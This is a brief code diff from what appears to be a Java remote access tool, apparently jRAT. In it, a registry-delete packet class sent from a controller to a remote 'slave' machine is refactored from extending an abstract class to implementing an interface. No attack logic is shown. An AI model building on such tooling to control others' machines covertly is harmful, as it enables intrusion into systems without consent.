@@ -1,10 +1,10 @@
 package jrat.module.registry;
 
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
+import jrat.controller.packets.outgoing.OutgoingPacket;
 
 
-public class PacketDelete extends AbstractOutgoingPacket {
+public class PacketDelete implements OutgoingPacket {
 
 	private String path;
 	private String value;
